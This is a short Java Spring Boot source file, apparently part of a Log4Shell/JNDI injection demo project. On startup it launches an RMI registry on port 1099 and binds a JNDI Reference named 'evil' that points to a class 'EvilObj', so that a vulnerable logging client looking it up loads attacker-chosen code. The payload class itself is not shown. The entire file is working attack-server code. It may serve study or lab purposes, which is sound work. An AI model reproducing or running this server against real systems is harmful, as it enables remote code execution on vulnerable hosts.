package com.bruce.log;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

@SpringBootApplication
public class LogApplication {

    private static Logger logger = LoggerFactory.getLogger(LogApplication.class);


    public static void main(String[] args) {
        SpringApplication.run(LogApplication.class, args);
        startRMIServer();
    }

    private static void startRMIServer() {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            logger.info("start server at port 1099");
            Reference reference = new Reference("com.bruce.log.entity.EvilObj", "com.bruce.log.entity.EvilObj", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
